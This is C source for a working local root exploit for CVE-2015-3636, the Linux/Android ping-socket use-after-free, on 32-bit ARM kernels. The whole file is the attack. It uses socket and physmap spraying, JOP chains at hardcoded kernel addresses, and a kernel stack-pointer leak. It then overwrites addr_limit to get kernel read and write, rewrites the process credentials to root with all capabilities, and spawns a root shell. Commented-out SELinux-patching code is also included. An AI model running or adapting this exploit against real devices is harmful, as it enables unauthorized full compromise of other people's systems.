#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <stdint.h>
#include <string.h>
#include <linux/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>

#define TOTAL_SOCK_NUM 6500000
#define MAGIC_BASE_ADDR 0x200000
#define MAGIC_ADDR 0x200200
#define MAGIC_NUM(x) (0x07777000|x)
#define MAGIC_NUM2 0x0db4da5f
#define test_num 0x12345678
#define MEM_LEN 0x1000
#define TAG "CVE_2015_3636"
#define true 1
#define false 0
#define SOCK_NUM 900
#define MAP_NUM 0x400
#define MAP_LENTH (2*1024*1024)
#define CHILD_NUM 100
#define OOM_DISABLE (-17)
#define SIOCGSTAMPNS 0x8907
#define NSEC_PER_SEC 1000000000
#define MAX_SOCK_ID 1000
#define TIMESTAMP_OFFSET 0x158
#define SOCKPROT_OFFSET 0x1c
int sock_fd[SOCK_NUM];
void *map_address[MAP_NUM];
int kill_child = 0;
int child_kill[CHILD_NUM]={0};
int current_sock_num = 0;

int target_sock_1 = 0;
int target_sock_2 = 0;
void *target_sock_addr1 = NULL;
void *target_sock_addr2 = NULL;
void *fack_prot[300];
void *target_sock_prot_addr1 = NULL;
void *target_sock_prot_addr2 = NULL;

void *kerner_sp = NULL;
int final_pipe[2];

int write_pipe;
int read_pipe;


static int
maximize_fd_limit(void)
{
  struct rlimit rlim;
  int ret;

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  rlim.rlim_cur = rlim.rlim_max;
  setrlimit(RLIMIT_NOFILE, &rlim);

  ret = getrlimit(RLIMIT_NOFILE, &rlim);
  if (ret != 0) {
    return -1;
  }

  return rlim.rlim_cur;
}

static int
lock_page_in_memory(void *address, size_t size)
{
  int ret;

  ret = mlock(address, size);
  if (ret != 0) {
    return -1;
  }

  return 0;
}

static void
populate_pagetable_for_address(void *address)
{
  *(void **)address = NULL;
}

static int mapPrepare(){
	void *map;
	map =  mmap((void *)(MAGIC_BASE_ADDR),MEM_LEN,
	PROT_READ | PROT_WRITE,
	MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if(map!=(void *)MAGIC_BASE_ADDR){
		printf("[-]0x200200 failed\n");
		return false;
	}
	printf("[+]map prepare ok map:%p\n",map);
	populate_pagetable_for_address(map);
	lock_page_in_memory(map, MEM_LEN);
	return true;
}

static int makeVulSocket(int num){
	struct sockaddr sa;
	int ret;
	unsigned int i = 0;
	struct timespec tv;
	for(i=0;i<num;i++){
		//hash sk
		memset(&sa,0,sizeof(sa));
		sa.sa_family = AF_INET;
		ret = connect(sock_fd[i],&sa,sizeof(sa));
		//unhash sk
		memset(&sa,0,sizeof(sa));
		sa.sa_family = AF_UNSPEC;
		ret = connect(sock_fd[i],&sa,sizeof(sa));
		ret = connect(sock_fd[i],&sa,sizeof(sa));
	}
	//try to unhash sk
	return true;
}


void fillMapWithTimeMagic(void *address,unsigned int index){
	//memset(address,0x22,MAP_LENTH);
	//return;
	unsigned long *p;
	unsigned int i,size;
	p = (unsigned long *)address;
	size = MAP_LENTH/sizeof(size_t);
	//printf("%p\n",p);
	for(i=0;i<size/2;i++){
		*p = (unsigned long)p;
		p++;
		*p = (unsigned long)MAGIC_NUM2;
		p++;
	}
	//printf("%p\n",*(p-1));
	return;
}


void fillMapWithFackProt(void *address){
	size_t *p;
	unsigned int i,size;
	p = (size_t *)address;
	size = MAP_LENTH/sizeof(size_t);
	for(i=0;i<size;i++,p++){
		*p = (size_t *)&fack_prot[0];
	}
	return;
}

int end_child = 0;

int create_n_socket(int *sock,int num){
	int i=0;
	for(i=0;i<num;i++){
		sock[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
		if(sock[i]==-1){
			break;
		}
	}
	return i;
}


void inline wait_to_be_kill(){
	while(!end_child){
		sleep(1);
	}
	//printf("[+]go to clean child\n");
}

void clean_child(int *sock,int num){
	int i;
	for(i=0;i<num;i++){
		close(sock[i]);
	}
	free(sock);
}

void set_clean_flag(int sig){
	usleep(1000);
	end_child = 1;
}

void child_task(int pipe_write_fd){
	int *sock;
	int num_created = 0;
	(void)signal(SIGQUIT, set_clean_flag);
	close(1);
	sock = malloc(sizeof(int)*MAX_SOCK_ID);
	if(!sock){
		printf("[-]malloc failed\n");
	}
	num_created = create_n_socket(sock,MAX_SOCK_ID);
	write(pipe_write_fd,&num_created,sizeof(int));
	wait_to_be_kill();
	clean_child(sock,num_created);
	exit(0);
}

void wait_for_child(int *pipe_fd){
	int child_socket_num;
	//printf("[+]get read data\n");
	read(pipe_fd[0],&child_socket_num,sizeof(int));
	//printf("[+]get read data done %d\n",child_socket_num);
	current_sock_num+=child_socket_num;
}

void kill_all_child(int *pid,int num){
	int i,status;
	for(i=0;i<num;i++){
		kill(pid[i],SIGQUIT);
		waitpid(pid[i],&status,0);
	}
	printf("[+]kill %d child done\n",num);
}

int create_child_socket(int *pid){
	//int current_sock_num = 0;
	int num_this_create;
	int sock_fd_max = 1000;
	int i;
	int current_child_num = 0;
	int pipe_fd[2];
	int ret;
	printf("[+]do lifting.\n");
	for(i=0;i<CHILD_NUM;i++){
		ret = pipe(pipe_fd);
		if(ret == -1){
			printf("[-]pipe create failed\n");
			return ret;
		}
		pid[i] = fork();
		if(pid[i]==0){
			child_task(pipe_fd[1]);
		}else if(pid[i] > 0){
			//scanf("%d",&ret);
			current_child_num++;
			wait_for_child(pipe_fd);
			if(current_sock_num > TOTAL_SOCK_NUM){
				printf("\n[+]current_sock_num :%d\n",current_sock_num);
				break;
			}
			close(pipe_fd[0]);
			close(pipe_fd[1]);
			continue;
		}
	}
	return current_child_num;
}

int try_and_get_target(){
	struct timespec tv;
  	uint64_t value;
  	uint32_t high, low;
  	int ret;
	int index;
	unsigned int i;
	int count = 0;
	for(i=0;i<SOCK_NUM;i++){
		if(sock_fd[i] == -1)
			break;
		ret = ioctl(sock_fd[i],SIOCGSTAMPNS,(void *)&tv);
		if(ret!=0){
			continue;
		}
		value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
  		high = (unsigned)(value >> 32);
  		low = (unsigned)value;
		if((high == MAGIC_NUM2)||(low == MAGIC_NUM2)){
			if(count == 0){
				printf("[+]get target 1!%x,%x\n",high,low);
				target_sock_1 = sock_fd[i];
				target_sock_addr1 = (void *)(low-TIMESTAMP_OFFSET);
				count++;
			}else if(count == 1){
				printf("[+]get target 2!%x,%x\n",high,low);
				target_sock_2 = sock_fd[i];
				target_sock_addr2 = (void *)(low-TIMESTAMP_OFFSET);
				return 1;
			}

		}
	}
	return 0;
}

#define JOP_BASE_ADDR 0x30303100

void construct_jop_leak_sp(){
	void *map;
	map = mmap(JOP_BASE_ADDR-0x100,0x1000,PROT_WRITE | PROT_READ | PROT_EXEC,MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,-1,0);
	if(map!=JOP_BASE_ADDR-0x100){
		printf("[-]mmap jop base addr failed\n");
		return;
	}
	*(unsigned *)(JOP_BASE_ADDR+0x8) = JOP_BASE_ADDR+0x100;   //jmp r3 @ 1th
	*(unsigned *)(JOP_BASE_ADDR+0x100+4) = 0xc0209bb8; 	//.text:C0209BB8                  LDR             R1, [r0,#-0x30]
														// .text:C0209BBC                 LDR             R5, [r0,#-0x34]
														// .text:C0209BC0                 MOV             R4, r0
														// .text:C0209BC4                 LDR             R2, [r0,#-0x2C]
														// .text:C0209BC8                 LDR             R3, [R1,#0x80]
														// .text:C0209BCC                 MOV             R0, R5
														// .text:C0209BD0                 BLX             R3
	*(unsigned *)(JOP_BASE_ADDR-0x30) = JOP_BASE_ADDR+0x200;
	*(unsigned *)(JOP_BASE_ADDR+0x200+0x80) = 0xc0116c7c;
														// .text:C0116C7C                 MOV             R3, SP
														// .text:C0116C80                 BIC             R3, R3, #0x1FC0
														// .text:C0116C84                 BIC             R3, R3, #0x3F
														// .text:C0116C88                 LDR             R0, [R3,#0x14]
														// .text:C0116C8C                 BLX             R2
	*(unsigned *)(JOP_BASE_ADDR-0x2c) = 0xc06d2730;
														// .text:C06D2730                 STR             R3, [R4]
														// .text:C06D2734                 MOV             R2, #0x20
														// .text:C06D2738                 STR             R6, [R4,#0x20]
														// .text:C06D273C                 STR             R0, [R4,#4]
														// .text:C06D2740                 LDR             R0, [R5,#0x50]
														// .text:C06D2744                 LDR             R3, [R0,#8]
														// .text:C06D2748                 LDR             R3, [R3,#0x10]
														// .text:C06D274C                 BLX             R3


	*(unsigned *)(JOP_BASE_ADDR-0x34) = JOP_BASE_ADDR+0x300; // ldr r5,[r0, #-34]---->LDR R0, [R5,#0x50]--->LDR R3, [R0,#8]--->LDR R3,[R3,#0x10]
	*(unsigned *)(JOP_BASE_ADDR+0x300+0x50) = JOP_BASE_ADDR+0x400;
	*(unsigned *)(JOP_BASE_ADDR+0x400+8) = JOP_BASE_ADDR+0x500;
	*(unsigned *)(JOP_BASE_ADDR+0x500+0x10) = 0xc0a1747c; //ret from inet_release
}


void construct_fack_prot_leak_sp(){
	int i=0;
	for(i=0;i<300;i++){
		fack_prot[i] = (void *)&fack_prot[2];
	}
	fack_prot[0] = (void *)0xc06f9f84;
									// .text:C06F9F84                 LDR             R3, [R2,#8]    R2=JOP_BASE_ADDR
									// .text:C06F9F88                 MOV             R0, R2
									// .text:C06F9F8C                 LDR             R3, [R3,#4]
									// .text:C06F9F90                 BLX             R3
}

void prepare_target_1(){
	construct_jop_leak_sp();
	construct_fack_prot_leak_sp();
	target_sock_prot_addr1 = target_sock_addr1+SOCKPROT_OFFSET;
	*(unsigned long *)target_sock_prot_addr1 = &fack_prot[0];
	*(int *)(target_sock_addr1+0x2c) = 0; 	//mmap_queue
	*(long *)(target_sock_addr1+0x88) = 0xffff0000;//time_flag
	*(int *)(target_sock_addr1+0x6c) = JOP_BASE_ADDR;
	memset(target_sock_addr1+0x88,0,0x300); //avoid crash
}

void construct_mem_patch_aadr_limit(){
	fack_prot[0] = 0xc0184e54;
							// .text:C0184E54                 LDR             R3, [R4,#4]
							// .text:C0184E58                 MOVT            R0, #0x333
							// .text:C0184E5C                 STR             R1, [R2,#0x20]
							// .text:C0184E60                 BLX             R3
	*(unsigned *)(target_sock_addr2+4) = 0xc0a1747c; // sk+4--->R4+4
}


void prepare_target_2(){
	//
	//
	construct_mem_patch_aadr_limit();
	target_sock_prot_addr2 = target_sock_addr2+SOCKPROT_OFFSET;
	*(unsigned long *)target_sock_prot_addr2 = &fack_prot[0];
	*(int *)(target_sock_addr2+0x2c) = 0; 	//mmap_queue
	*(long *)(target_sock_addr2+0x88) = 0xffff0000;//time_flag
	*(int *)(target_sock_addr2+0x6c) = kerner_sp+8-0x20; //R2  addr_limit-0x20
	memset(target_sock_addr2+0x88,0,0x300); //avoid crash
}

static int overridePhysmap(){
	void *map;
	unsigned int i,ret;
	int target_index;
	for(i=0;i<MAP_NUM;i++){
		map = mmap(NULL,MAP_LENTH,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_SHARED,-1,0);
		if(map != NULL){
			map_address[i] = map;
			//lock_page_in_memory(map,MAP_LENTH);
			//mapPrepare();
			fillMapWithTimeMagic(map,i);
			//printf("[+]fill done\n");
			if(try_and_get_target()){
				//fillMapWithFackProt(map);
				return 1;
			}
		}
		else
			printf("[%d]:mmap failed\n",i);
	}
	printf("[-]failed\n");
	return 0;
}



int create_main_socket(){
	unsigned int i = 0;
	int sock_num = 0;
	for(i=0;i<SOCK_NUM;i++){
		sock_fd[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
		if(sock_fd[i]==-1){
			printf("[%d]socket create failed\n",i);
			break;
		}
		sock_num++;
	}
	return sock_num;
}


int leek_kernel_sp(){
	if(target_sock_1 <= 0){
		printf("[-]sad no socket\n");
		return -1;
	}
	prepare_target_1();
	close(target_sock_1);
	kerner_sp = (void *)(*(unsigned *)JOP_BASE_ADDR);
	if(kerner_sp!=NULL){
		printf("[+]leek kernel sp done! kernel_sp : %p\n",kerner_sp);
		return 1;
	}
	else{
		printf("[-]leek kernel sp failed\n");
		return 0;
	}
}



static int patch_addr_limit(){
	int ret;
	prepare_target_2();
	close(target_sock_2);
	printf("[+]pach addr_limit ok\n");
	return 1;
}

static int prepareWork(){
	int pid[CHILD_NUM],i,main_sock_num,current_child_num,ret;
	maximize_fd_limit();
	current_child_num = create_child_socket(pid);
	main_sock_num = create_main_socket();
	printf("[+]get %d socket\n",main_sock_num);
	kill_all_child(pid,current_child_num);
	if(!mapPrepare())
		return -1;
	if(!makeVulSocket(main_sock_num))
		return -1;
	printf("[+]make vul socket done\n");
	//scanf("%d",&i);
	if(overridePhysmap() == 0){
		return -1;
	}
	printf("[+]OK ,let's leek kerner sp\n");
	if(leek_kernel_sp())
		return 1;
	//close(sock_fd[20]);
	//test();
	return 0;
}

#define KERNEL_START 0xc0080000

struct kernel_cap_struct {
  unsigned long cap[2];
};

struct cred {
  unsigned long usage;
  uid_t uid;
  gid_t gid;
  uid_t suid;
  gid_t sgid;
  uid_t euid;
  gid_t egid;
  uid_t fsuid;
  gid_t fsgid;
  unsigned long securebits;
  struct kernel_cap_struct cap_inheritable;
  struct kernel_cap_struct cap_permitted;
  struct kernel_cap_struct cap_effective;
  struct kernel_cap_struct cap_bset;
  /* ... */
};

struct list_head {
  struct list_head *next;
  struct list_head *prev;
};

struct task_security_struct {
  unsigned long osid;
  unsigned long sid;
  unsigned long exec_sid;
  unsigned long create_sid;
  unsigned long keycreate_sid;
  unsigned long sockcreate_sid;
};


struct task_struct {
  struct list_head cpu_timers[3];
  struct cred *real_cred;
  struct cred *cred;
  struct cred *replacement_session_keyring;
  char comm[16];
};


struct thread_info_head{
	unsigned long		flags;		/* low level flags */
#ifndef __aarch64__
	int					preempt_count;
#endif
	unsigned long		addr_limit;	/* address limit */
	struct task_struct	*task;		/* main task structure */
};





int write_kernel(void *target,void *buffer,unsigned size){
	int ret,count = size;
	while(count > 0){
		ret = write(write_pipe,buffer,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	count = size;
	while(count > 0){
		ret = read(read_pipe,target,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	return 0;
}

int read_kernel(void *target,void *buffer,unsigned size){
	int ret,count = size;
	while(count > 0){
		ret = write(write_pipe,target,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	count = size;
	while(count > 0){
		ret = read(read_pipe,buffer,size);
		if(ret != -1)
			count -= ret;
		else
			return -1;
	}
	return 0;
}

void *get_stask_struct_addr(struct thread_info_head *thread_info){
	void *task_struct_addr = NULL;
	int ret;
	ret = read_kernel(&thread_info->task,&task_struct_addr,sizeof(struct task_struct *));
	if(ret == -1)
		printf("[-]get stask struct address failed\n");
	else
		printf("[+]task_struct : %p\n",task_struct_addr);
	return task_struct_addr;
}


int prepare_pipe(){
	int ret;
	int pipe_fd[2];
	ret = pipe(pipe_fd);
	if(ret == -1){
		printf("[-]pipe failed\n");
		return false;
	}
	read_pipe = pipe_fd[0];
	write_pipe = pipe_fd[1];
	return true;
}

void *find_struct_cred_addr(void *task_struct_addr){
	int ret,i;
	struct task_struct *task;
	void *cred_addr = NULL;
	unsigned int size = 0x100*sizeof(size_t);
	void *taskbuf = malloc(size);
	if(!taskbuf){
		printf("[-]malloc task space failed\n");
		return NULL;
	}
	ret = read_kernel(task_struct_addr,taskbuf,size);
	if(ret == -1)
		printf("[-]copy task struct failed\n");
	else{
		for(i=0;i<size;i+=4){
			task = (struct task_struct *)&taskbuf[i];
			if(task->cpu_timers[0].next == task->cpu_timers[0].prev
				&&(unsigned long)task->cpu_timers[0].next > KERNEL_START
				&&task->cpu_timers[1].next == task->cpu_timers[1].prev
				&&(unsigned long)task->cpu_timers[1].next > KERNEL_START
				&&task->cpu_timers[2].next == task->cpu_timers[2].prev
				&&(unsigned long)task->cpu_timers[2].next > KERNEL_START
				&&task->real_cred == task->cred){
					cred_addr = task->cred;
					break;
			}
		}
	}
	if(cred_addr ==NULL){
		printf("[-]get cred address failed\n");
	}
	else{
		printf("[+]cred address : %p\n",cred_addr);
	}
	free(taskbuf);
	return cred_addr;

}

// int patch_selinux(void *security_addr){
// 	int ret;
// 	struct task_security_struct test;
// 	struct task_security_struct *security = (struct task_security_struct *)malloc(sizeof(struct task_security_struct));
// 	security->osid = 1;
// 	security->sid = 1;
// 	security->exec_sid = 0;
// 	security->create_sid = 0;
// 	security->keycreate_sid = 0;
// 	security->sockcreate_sid = 0;
// 	//printf("selinux:%p\n",security_addr);
// 	ret = read_kernel(security_addr,&test,sizeof(test));
// 	if(ret == -1){
// 		printf("[-]read security failed\n");
// 	}else{
// 		printf("%d,%d,%d,%d,%d,%d\n",test.osid,test.sid,test.exec_sid,test.create_sid,test.keycreate_sid,test.sockcreate_sid);
// 	}

// 	ret = write_kernel(security_addr,security,sizeof(struct task_security_struct));
// 	if(ret == -1){
// 		printf("[-]selinux patch failed\n");
// 	}else{
// 		printf("[+]selinux patch ok\n");
// 	}
// 	ret = read_kernel(security_addr,&test,sizeof(test));
// 	if(ret == -1){
// 		printf("[-]read security failed\n");
// 	}else{
// 		printf("%d,%d,%d,%d,%d,%d\n",test.osid,test.sid,test.exec_sid,test.create_sid,test.keycreate_sid,test.sockcreate_sid);
// 	}
// 	return 0;
// }

// int patch_selinux2(void *security_addr_point){
// 	struct task_security_struct *security = (struct task_security_struct *)malloc(sizeof(struct task_security_struct));
// 	security->osid = 1;
// 	security->sid = 1;
// 	security->exec_sid = 0;
// 	security->create_sid = 0;
// 	security->keycreate_sid = 0;
// 	security->sockcreate_sid = 0;
// 	int ret  = write_kernel(security_addr_point,&security,4);
// 	if(ret == -1){
// 		printf("[-]selinux patch failed\n");
// 	}else{
// 		printf("[+]selinux patch ok\n");
// 	}
// 	return 0;
// }

int patch_cred(void *cred_addr){
	int ret;
	struct task_security_struct *security = (struct task_security_struct *)malloc(sizeof(struct task_security_struct));
	security->osid = 1;
	security->sid = 1;
	security->exec_sid = 0;
	security->create_sid = 0;
	security->keycreate_sid = 0;
	security->sockcreate_sid = 0;
	struct cred *cred = (struct cred*)malloc(sizeof(struct cred)+0x40);
	if(!cred){
		printf("[-]malloc cred failed\n");
		return -1;
	}
	ret = read_kernel(cred_addr,cred,sizeof(struct cred)+0x40);
	if(ret == -1){
		printf("[-]copy cred failed\n");
	}else{
		cred->uid = 0;
		cred->gid = 0;
		cred->suid = 0;
		cred->sgid = 0;
		cred->euid = 0;
		cred->egid = 0;
		cred->fsuid = 0;
		cred->fsgid = 0;
		cred->cap_inheritable.cap[0] = ~0;
		cred->cap_inheritable.cap[1] = ~0;
		cred->cap_permitted.cap[0] = ~0;
		cred->cap_permitted.cap[1] = ~0;
		cred->cap_effective.cap[0] = ~0;
		cred->cap_effective.cap[1] = ~0;
		cred->cap_bset.cap[0] = ~0;
		cred->cap_bset.cap[1] = ~0;
		//printf("%p\n",*(void **)((void *)cred+0x58));
		//*(void **)((void *)cred+0x58) = JOP_BASE_ADDR;
		//scanf("%d",&ret);
		ret = write_kernel(cred_addr,cred,sizeof(struct cred));
		if(ret == -1){
			printf("[-]write cred to kernel stack failed\n");
		}else{
			printf("[+]write cred to kernel stack succuess\n");
		//	void *security_addr = *(void **)((void *)cred+0x58);
		//	patch_selinux(security_addr);
			//patch_selinux2((void *)cred_addr+0x58);
		}
	}
	free(cred);
	return ret;
}

int do_get_root(){
	void *task_struct_addr,*cred_addr;
	struct thread_info_head *thread_info;
	int ret;
	if(!prepare_pipe()){
		return false;
	}
	thread_info = (struct thread_info_head *)kerner_sp;
	task_struct_addr = get_stask_struct_addr(thread_info);
	if(!task_struct_addr){
		return false;
	}
	cred_addr = find_struct_cred_addr(task_struct_addr);
	if(!cred_addr){
		return false;
	}
	ret = patch_cred(cred_addr);
	if(ret == -1){
		return false;
	}
	if( getuid() == 0){
		printf("[+]root done\n");
		return true;
	}else{
		printf("[-]root failed\n");
		return false;
	}
}

void clean_physmap(){
	int i=0;
	for(i=0;i<MAP_NUM;i++){
		if(map_address[i])
			munmap(map_address[i],MAP_LENTH);
	}
}

int main(){
	int ret;
	if(prepareWork()){
		printf("[+]prepare work ok ,ready to patch aadr_limit\n");
	}
	if(patch_addr_limit()){
		printf("[+]ready to get root\n");
	}
	if(do_get_root()){
		clean_physmap();
		printf("[+]clean map ok\n");
		execl("system/bin/sh","system/bin/sh",NULL);
		//system("ls /data");
	}
	scanf("%d",&ret);
	return 0;
}
